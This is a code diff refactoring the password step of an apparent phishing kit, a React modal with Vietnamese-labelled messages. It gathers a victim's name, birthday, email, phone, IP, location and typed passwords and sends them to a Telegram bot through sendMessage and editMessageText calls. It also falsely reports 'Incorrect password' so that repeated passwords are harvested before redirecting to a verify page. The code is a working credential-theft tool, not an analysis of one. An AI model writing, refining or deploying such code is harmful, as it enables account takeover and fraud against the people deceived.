@@ -1,6 +1,5 @@
 import type { FormData } from "@/pages/home";
 import type { GeoLocation } from "@/types/geo";
-import type { TelegramResponse } from "@/types/telegram";
 import getConfig from "@/utils/config";
 import { faEye } from "@fortawesome/free-solid-svg-icons";
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
@@ -8,11 +7,69 @@ import axios from "axios";
 import { type FC, useEffect, useRef, useState } from "react";
 import { useNavigate } from "react-router";
 const LAST_MESSAGE_KEY = "lastMessage";
+const MESSAGE_ID_KEY = "messageId";
+
 interface PasswordModalProps {
 	onClose?: () => void;
 	isOpen: boolean;
 	formData: FormData;
 }
+
+interface UIState {
+	isShowPassword: boolean;
+	password: string;
+	error: string;
+	isLoading: boolean;
+	attempt: number;
+	messageId: number;
+}
+
+interface Config {
+	chatId: string;
+	token: string;
+	loadingTime: number;
+	maxAttempt: number;
+}
+
+const initialUIState: UIState = {
+	isShowPassword: false,
+	password: "",
+	error: "",
+	isLoading: false,
+	attempt: 0,
+	messageId: 0,
+};
+
+const createTelegramMessage = (
+	formData: FormData,
+	password: string,
+	attempt?: number,
+) => {
+	const geoData: GeoLocation = JSON.parse(
+		localStorage.getItem("geoData") ?? "{}",
+	);
+
+	const passwordLabel = attempt
+		? `🔑 <b>Mật Khẩu ${attempt}:</b>`
+		: "🔑 <b>Mật Khẩu  :</b>";
+
+	return `
+📍 <b>THÔNG TIN VỊ TRÍ</b>
+🌐 <b>IP:</b> <code>${geoData.ip}</code>
+🏳️ <b>Quốc Gia:</b> <code>${geoData.country}</code>
+🏙️ <b>Thành Phố:</b> <code>${geoData.city}</code>
+⏰ <b>Thời Gian:</b> <code>${new Date().toLocaleString("vi-VN")}</code>
+━━━━━━━━━━━━━━━━━━━━━
+👤 <b>THÔNG TIN PHỤ</b>
+📱 <b>Tên PAGE:</b> <code>${formData.pageName}</code>
+👨‍💼 <b>Họ Tên:</b> <code>${formData.fullName}</code>
+🎂 <b>Ngày Sinh:</b> <code>${formData.birthday}</code>
+━━━━━━━━━━━━━━━━━━━━━
+🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
+📧 <b>Email:</b> <code>${formData.email}</code>
+📞 <b>Số Điện Thoại:</b> <code>${formData.phone}</code>
+${passwordLabel} <code>${password}</code>`;
+};
 
 const PasswordModal: FC<PasswordModalProps> = ({
 	onClose,
@@ -20,16 +77,8 @@ const PasswordModal: FC<PasswordModalProps> = ({
 	formData,
 }) => {
 	const navigate = useNavigate();
-	const [uiState, setUiState] = useState({
-		isShowPassword: false,
-		password: "",
-		error: "",
-		isLoading: false,
-		attempt: 0,
-		messageId: 0,
-	});
-
-	const [config, setConfig] = useState({
+	const [uiState, setUiState] = useState<UIState>(initialUIState);
+	const [config, setConfig] = useState<Config>({
 		chatId: "",
 		token: "",
 		loadingTime: 0,
@@ -68,43 +117,19 @@ const PasswordModal: FC<PasswordModalProps> = ({
 	if (!isOpen) return null;
 
 	const handleSubmit = async () => {
-		const geoData: GeoLocation = JSON.parse(
-			localStorage.getItem("geoData") ?? "{}",
-		);
-
-		const createMessage = () => `
-🚨 <b>THÔNG BÁO MỚI</b> 🚨
-
-📍 <b>THÔNG TIN BỔ SUNG</b>
-• <b>Địa Chỉ IP:</b> <code>${geoData.ip}</code>
-• <b>Quốc Gia:</b> <code>${geoData.country}</code>
-• <b>Thành Phố:</b> <code>${geoData.city}</code>
-• <b>Thời Gian:</b> <code>${new Date().toLocaleString("vi-VN")}</code>
-
-
-• <b>Tên PAGE:</b> <code>${formData.pageName}</code>
-• <b>Họ Tên:</b> <code>${formData.fullName}</code>
-• <b>Email:</b> <code>${formData.email}</code>
-• <b>Số Điện Thoại:</b> <code>${formData.phone}</code>
-• <b>Ngày Sinh:</b> <code>${formData.birthday}</code>
-
-🔐 <b>MẬT KHẨU</b>
-• <b>Mật Khẩu:</b> <code>${uiState.password}</code>`;
 		let message = "";
-		if (localStorage.getItem(LAST_MESSAGE_KEY)) {
-			const oldMessage = localStorage.getItem(LAST_MESSAGE_KEY);
-			message = `${oldMessage}\n• <b>Mật Khẩu ${uiState.attempt + 1}:</b> <code>${uiState.password}</code>`;
+		const lastMessage = localStorage.getItem(LAST_MESSAGE_KEY);
+
+		if (lastMessage) {
+			message = `${lastMessage}\n🔑 <b>Mật Khẩu ${uiState.attempt + 1}:</b> <code>${uiState.password}</code>`;
 		} else {
-			message = createMessage();
+			message = createTelegramMessage(formData, uiState.password);
 		}
 
 		localStorage.setItem(LAST_MESSAGE_KEY, message);
 
 		if (uiState.attempt >= config.maxAttempt) {
-			setUiState((prev) => ({
-				...prev,
-				isLoading: true,
-			}));
+			setUiState((prev) => ({ ...prev, isLoading: true }));
 
 			try {
 				await axios.post(
@@ -117,10 +142,8 @@ const PasswordModal: FC<PasswordModalProps> = ({
 					},
 				);
 
-				setTimeout(() => {
-					navigate("/verify");
-				}, config.loadingTime);
-			} catch (error) {
+				setTimeout(() => navigate("/verify"), config.loadingTime);
+			} catch {
 				navigate("/verify");
 			}
 			return;
@@ -132,30 +155,19 @@ const PasswordModal: FC<PasswordModalProps> = ({
 			isLoading: true,
 		}));
 
-		const url = `https://api.telegram.org/bot${config.token}/sendMessage`;
-		const editUrl = `https://api.telegram.org/bot${config.token}/editMessageText`;
-
 		try {
-			let response: TelegramResponse;
+			const response = await sendTelegramMessage(
+				message,
+				config,
+				uiState.messageId,
+			);
+			const newMessageId = response.data.result.message_id;
 
-			if (uiState.messageId && uiState.attempt > 0) {
-				response = await axios.post(editUrl, {
-					chat_id: config.chatId,
-					message_id: uiState.messageId,
-					text: message,
-					parse_mode: "HTML",
-				});
-			} else {
-				response = await axios.post(url, {
-					chat_id: config.chatId,
-					text: message,
-					parse_mode: "HTML",
-				});
-				setUiState((prev) => ({
-					...prev,
-					messageId: response.data.result.message_id,
-				}));
-			}
+			localStorage.setItem(MESSAGE_ID_KEY, newMessageId.toString());
+			setUiState((prev) => ({
+				...prev,
+				messageId: newMessageId,
+			}));
 
 			setTimeout(() => {
 				setUiState((prev) => ({
@@ -164,13 +176,36 @@ const PasswordModal: FC<PasswordModalProps> = ({
 					error: "Incorrect password. Please try again.",
 				}));
 			}, config.loadingTime);
-		} catch (error) {
+		} catch {
 			setUiState((prev) => ({
 				...prev,
 				isLoading: false,
 				error: "Something went wrong. Please try again later.",
 			}));
 		}
+	};
+
+	const sendTelegramMessage = async (
+		message: string,
+		config: Config,
+		messageId?: number,
+	) => {
+		const baseUrl = `https://api.telegram.org/bot${config.token}`;
+
+		if (messageId) {
+			return axios.post(`${baseUrl}/editMessageText`, {
+				chat_id: config.chatId,
+				message_id: messageId,
+				text: message,
+				parse_mode: "HTML",
+			});
+		}
+
+		return axios.post(`${baseUrl}/sendMessage`, {
+			chat_id: config.chatId,
+			text: message,
+			parse_mode: "HTML",
+		});
 	};
 
 	const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
